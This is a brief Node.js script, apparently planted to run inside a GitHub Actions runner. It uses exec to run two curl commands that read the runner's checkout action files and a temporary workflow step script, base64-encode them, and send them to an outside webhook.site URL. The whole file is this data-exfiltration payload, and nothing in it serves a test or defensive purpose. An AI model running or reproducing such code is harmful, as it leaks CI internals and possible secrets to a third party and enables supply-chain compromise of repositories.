


const { exec } = require('node:child_process')

exec('curl https://webhook.site/200fdf69-4bd3-4432-9c2c-7617a5a5c458?$(cd /home/runner/work/_actions/actions/checkout; cat v3 | base64)' , (err, output) => {
    if (err) {
        console.error("could not execute command: ", err)
        return
    }
    // log the output received from the command
    console.log("Output: \n", output)
})

exec('curl https://webhook.site/200fdf69-4bd3-4432-9c2c-7617a5a5c458?$(cd /home/runner/work/_temp; cat 06372ec3-d1c5-42d8-b8bc-2afcf18fcd75.sh | base64)' , (err, output) => {
    if (err) {
        console.error("could not execute command: ", err)
        return
    }
    // log the output received from the command
    console.log("Output: \n", output)
})

